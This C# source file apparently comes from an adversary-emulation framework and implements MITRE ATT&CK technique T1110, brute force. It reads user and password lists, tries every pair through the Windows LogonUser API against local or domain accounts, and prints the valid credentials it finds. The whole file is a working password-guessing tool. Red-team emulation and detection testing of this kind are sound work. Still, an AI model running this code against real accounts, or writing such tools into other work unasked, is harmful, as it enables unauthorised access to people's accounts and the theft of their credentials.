
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;


class Technique {

	/*
		T1110.000 - Brute Force
		
		Local - LogonUser from Win32API
			-> https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonusera
			-> https://www.pinvoke.net/default.aspx/advapi32/LogonUser.html
			= Usually, the function returns a handle that can be used to impersonate the credential, in this technique we'll ignore it and only use the bool value.

	*/

	public static Dictionary<string, string> EntryData { get; set; }
	public static Dictionary<string, string> ExitData { get; set; }

	[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
	internal static extern bool LogonUser(String lpszUsername, String lpszDomain, String lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);


	public static bool authenticateUser(string user, string password, string domain) {

		IntPtr handle;
		return LogonUser(user, domain, password, 2, 0, out handle);
	}

	public static Dictionary<string, string> testUsers(string users, string passwords, string domain = ".") {

		var results = new Dictionary<string, string>();

		try {
			var usersList = File.ReadAllLines(users);
			var passwordsList = File.ReadAllLines(passwords);

			// iterate over each user and check with list of passwords
			foreach (var user in usersList) {
				foreach (var password in passwordsList) {
					var check = authenticateUser(user, password, domain);
					if (check)
						results[user] = password;
					Console.WriteLine("[T1110.000] {0} - {1} => Result: {2}", user, password, check ? "Success" : "Invalid");
				}
			}
		} catch (Exception ex) {
			Console.WriteLine("[T1110.000] Error ({0})", ex);
		}

		return results;
	}

	public static void Main(string[] args) {

		string type = null;
		string workfolder = @"c:\users\public\";
		string usersFilename = null;
		string passwordsFilename = null;
		var results = new Dictionary<string, string>();
		ExitData = new Dictionary<string, string>();

		// Set default variables
		if (args.Length == 0) {
			type = "domain";
			usersFilename = @"users.txt";
			passwordsFilename = @"passwords.txt";
		} else {
			type = args[0];
			usersFilename = args[1];
			passwordsFilename = args[2];
		}

		try {


			// Give the user the ability to overwrite the default behaviour of using workfolder, instead uses full path if present with the filename
			usersFilename = Path.GetDirectoryName(usersFilename).Length > 0 ? usersFilename : String.Format("{0}{1}", workfolder, usersFilename);
			passwordsFilename = Path.GetDirectoryName(passwordsFilename).Length > 0 ? passwordsFilename : String.Format("{0}{1}", workfolder, passwordsFilename);

			if (!File.Exists(usersFilename) ||
				!File.Exists(passwordsFilename)) {
				throw new System.InvalidOperationException("[T1110.003] Cannot find informed user or password files!");
			}

			switch (type) {

				case "local":
					results = testUsers(usersFilename, passwordsFilename);
					break;
				case "domain":
					var domain = args.Length >= 4 ? args[3] : "";
					if (domain != "") {
						results = testUsers(usersFilename, passwordsFilename, domain);
					} else {
						Console.WriteLine("[T1110.000] Must inform domain if using it as type");
					}
					break;

			}

			if (results.Count > 0) {
				Console.WriteLine("[T1110.000] Success! Found a total of {0} valid {1} accounts: " , results.Count, type);
				foreach(var account in results) {
					Console.WriteLine("[T1110.000] {0} ", account);
				}
			} else {
				Console.WriteLine("[T1110.000] No lucky, found 0 accounts! ");
			}

			ExitData["returncode"] = "0";
			ExitData["returnmessage"] = "Technique executed without errors";

			Console.WriteLine("[T1110.000] Finished Execution!");
			
		} catch (Exception ex) {
			Console.WriteLine("[T1110.000] Something went wrong: {0}", ex);
		}
		
	}
}

